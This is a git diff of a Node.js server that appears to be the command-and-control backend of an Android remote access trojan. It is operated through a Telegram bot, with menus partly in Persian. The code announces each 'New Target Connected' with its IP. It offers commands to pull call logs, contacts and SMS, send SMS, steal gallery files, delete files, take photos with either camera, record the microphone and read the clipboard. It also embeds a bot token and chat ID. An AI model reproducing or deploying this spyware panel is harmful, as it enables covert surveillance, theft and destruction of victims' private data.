@@ -3,23 +3,19 @@ const http = require('http')
 const express = require("express")
 const TelegramBot = require('node-telegram-bot-api');
 const multer = require('multer');
-const bodyParser = require('body-parser');
-const uuid4 = require('uuid');
-const axios = require('axios');
+const bodyParser = require('body-parser')
+const uuid4 = require('uuid')
+const axios = require('axios')
 
 const upload = multer();
 const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
-const wss = new socket.Server({
-    server
-});
+const wss = new socket.Server({server});
 const chatId = '2126570077'
 const token = '5315940052:AAEcwcweFnYuy1Z0dGJuu0Hiq8tAWMZjfo4'
-const serverAddr = 'https://natural-glen-jasper.glitch.me/'
-const bot = new TelegramBot(token, {
-    polling: true
-});
+const serverAddr = 'https://equal-enshrined-sauroposeidon.glitch.me/'
+const bot = new TelegramBot(token, {polling: true});
 
 // request -
 app.get("/", (req, res) => {
@@ -37,9 +33,7 @@ app.post("/sendFile", upload.single('file'), (req, res) => {
     res.send(name)
 })
 app.post("/sendText", (req, res) => {
-    bot.sendMessage(chatId, req.body['data'], {
-        parse_mode: "HTML"
-    })
+    bot.sendMessage(chatId, req.body['data'], {parse_mode: "HTML"})
     res.send(req.body['data'])
 })
 app.post("/sendLocation", (req, res) => {
@@ -55,9 +49,7 @@ server.listen(process.env.PORT || 8999, () => {
 // real time -
 wss.on('connection', (ws, req) => {
     ws.uuid = uuid4.v4()
-    bot.sendMessage(chatId, `<b>New Target Connected 📱\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.toString().replaceAll('f', '').replaceAll(':', '')}</b> 🌐`, {
-        parse_mode: "HTML"
-    })
+    bot.sendMessage(chatId, `<b>New Target Connected 📱\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.toString().replaceAll('f', '').replaceAll(':', '')}</b> 🌐`, {parse_mode: "HTML"})
 });
 setInterval(() => {
     wss.clients.forEach((client) => {
@@ -68,10 +60,7 @@ bot.on("message", (msg) => {
     if (msg.text === '/start') {
         bot.sendMessage(chatId, "✅Started JS Remote control panel", {
             "reply_markup": {
-                "keyboard": [
-                    ["📲لیست کاربران"],
-                    ["📟کنترل کاربران"]
-                ]
+                "keyboard": [["📲لیست کاربران"], ["📟کنترل کاربران"]]
             }
         });
     }
@@ -86,63 +75,19 @@ bot.on("message", (msg) => {
         } else {
             status += `<b>User Is Offline</b> 😴`
         }
-        bot.sendMessage(chatId, status, {
-            parse_mode: "HTML"
-        });
+        bot.sendMessage(chatId, status, {parse_mode: "HTML"});
     }
     if (msg.text === "📟کنترل کاربران") {
         const clientCount = wss.clients.size
         if (clientCount > 0) {
             let Actions = [
-                [{
-                    text: 'گزارش های تماس📞',
-                    callback_data: "cl"
-                }, {
-                    text: 'لیست مخاطبین👤',
-                    callback_data: "gc"
-                }],
-                [{
-                    text: 'لیست اس ام اس ها💬',
-                    callback_data: "as"
-                }, {
-                    text: 'ارسال اس ام اس💬',
-                    callback_data: "ss"
-                }],
-                [{
-                    text: 'برنامه های نصب شده📲',
-                    callback_data: "ia"
-                }, {
-                    text: 'مدل گوشی و میزان شارژ📱',
-                    callback_data: 'dm'
-                }],
-                [{
-                    text: 'دریافت فایل ها و گالری📄',
-                    callback_data: 'gf'
-                }, {
-                    text: 'حذف فایل ها🗑',
-                    callback_data: 'df'
-                }],
-                [{
-                    text: 'دوربین عقب 📷',
-                    callback_data: 'cam1'
-                }, {
-                    text: 'دوربین جلو 🤳',
-                    callback_data: 'cam2'
-                }],
-                [{
-                    text: 'rec 10s🎤',
-                    callback_data: 'mi1'
-                }, {
-                    text: 'rec 20s🎤',
-                    callback_data: 'mi2'
-                }, {
-                    text: 'rec 30s🎤',
-                    callback_data: 'mi3'
-                }],
-                [{
-                    text: 'متن های کپی شده📄',
-                    callback_data: 'cp'
-                }],
+                [{text: 'گزارش های تماس📞', callback_data: "cl"},{text: 'لیست مخاطبین👤', callback_data: "gc"}],
+                [{text: 'لیست اس ام اس ها💬', callback_data: "as"},{text: 'ارسال اس ام اس💬', callback_data: "ss"}],
+                [{text: 'برنامه های نصب شده📲', callback_data: "ia"},{text: 'مدل گوشی و میزان شارژ📱', callback_data: 'dm'}],
+                [{text: 'دریافت فایل ها و گالری📄', callback_data: 'gf'},{text: 'حذف فایل ها🗑', callback_data: 'df'}],
+                [{text: 'دوربین عقب 📷', callback_data: 'cam1'},{text: 'دوربین جلو 🤳', callback_data: 'cam2'}],
+                [{text: 'rec 10s🎤', callback_data: 'mi1'},{text: 'rec 20s🎤', callback_data: 'mi2'},{text: 'rec 30s🎤', callback_data: 'mi3'}],
+                [{text: 'متن های کپی شده📄', callback_data: 'cp'}],
             ]
             wss.clients.forEach((ws) => {
                 bot.sendMessage(chatId, `<b>📟Panel Control📟 Id:</b>\n&${ws.uuid}`, {
@@ -154,26 +99,21 @@ bot.on("message", (msg) => {
                 })
             })
         } else {
-            bot.sendMessage(chatId, `<b>کاربر از نرم افزار خارج شد</b> 😴`, {
-                parse_mode: "HTML"
-            });
+            bot.sendMessage(chatId, `<b>User Is Offline</b> 😴`, {parse_mode: "HTML"});
         }
     }
     if (msg.reply_to_message) {
-        if (msg.reply_to_message.text.split('&')[0] === 'ss') {
+        if (msg.reply_to_message.text.split('&')[0] === 'ss'){
             const data = msg.text.split(']')[0].split("[")[1]
             const uuid = msg.reply_to_message.text.split('!')[0].split('&')[1]
-            wss.clients.forEach(client => {
+            wss.clients.forEach(client=>{
                 if (client.uuid === uuid) {
                     client.send(`ss&${data}`)
                 }
             })
-            bot.sendMessage(chatId, "درحال انجام ...", {
+            bot.sendMessage(chatId, "Your Request Is On Progress !", {
                 "reply_markup": {
-                    "keyboard": [
-                        ["📲لیست کاربران"],
-                        ["📟کنترل کاربران"]
-                    ]
+                    "keyboard": [["📲لیست کاربران"], ["📟کنترل کاربران"]]
                 }
             });
         }
@@ -189,10 +129,7 @@ bot.on("message", (msg) => {
             })
             bot.sendMessage(chatId, "Your Request Is On Progress !", {
                 "reply_markup": {
-                    "keyboard": [
-                        ["📲لیست کاربران"],
-                        ["📟کنترل کاربران"]
-                    ]
+                    "keyboard": [["📲لیست کاربران"], ["📟کنترل کاربران"]]
                 }
             });
         }
@@ -207,7 +144,8 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
             if (action === 'ss') {
                 bot.sendMessage(
                     chatId,
-                    `ss&${client.uuid}!\n<b>Panel Send Sms📩\n Replace Number And Text:\n</b> <code>[{"number":"09111","message":"متن"}]</code>`, {
+                   `ss&${client.uuid}!\n<b>Panel Send Sms📩\n Replace Number And Text:\n</b> <code>[{"number":"09111","message":"متن"}]</code>`,
+                    {
                         reply_markup: {
                             force_reply: true,
                         },
@@ -217,12 +155,13 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
             } else if (action === 'gf') {
                 bot.sendMessage(
                     chatId,
-                    `gf&${client.uuid}!\n<b>Panel Revice File📁\n Reply Send Name Folder:\n</b>
+                `gf&${client.uuid}!\n<b>Panel Revice File📁\n Reply Send Name Folder:\n</b>
 <code>Download</code>\n
 <code>DCIM/Camera</code>\n
 <code>DCIM/Screenshots</code>\n
 <code>Pictures/Telegram</code>
-`, {
+`,
+                    {
                         reply_markup: {
                             force_reply: true,
                         },
@@ -232,12 +171,13 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
             } else if (action === 'df') {
                 bot.sendMessage(
                     chatId,
-                    `df&${client.uuid}!\n<b>Panel Delete File🗑 \n Reply Send Name Folder:\n</b>
+         `df&${client.uuid}!\n<b>Panel Delete File🗑 \n Reply Send Name Folder:\n</b>
 <code>Download</code>\n
 <code>DCIM/Camera</code>\n
 <code>DCIM/Screenshots</code>\n
 <code>Pictures/Telegram</code>
-`, {
+`,
+                    {
                         reply_markup: {
                             force_reply: true,
                         },
@@ -254,4 +194,4 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
 // real time -
 setInterval(() => {
     axios.get(serverAddr)
-}, 100000);
+}, 120000);
